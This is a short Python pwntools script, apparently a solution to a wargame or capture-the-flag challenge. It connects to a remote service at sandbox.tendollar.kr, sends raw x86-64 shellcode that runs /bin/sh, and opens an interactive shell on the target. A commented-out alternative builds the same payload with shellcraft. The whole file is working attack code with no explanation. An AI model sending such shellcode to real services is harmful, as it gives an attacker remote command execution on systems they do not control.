#-*- coding: utf-8 -*-
from pwn import *

r = remote("sandbox.tendollar.kr", 10000)
print r.recvuntil("> ")

# http://shell-storm.org/shellcode/files/shellcode-806.php
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# shellcraft version
'''
sc = shellcraft.amd64.sh()
sc = asm(sc, arch='amd64')
'''

r.send(sc)
r.interactive()
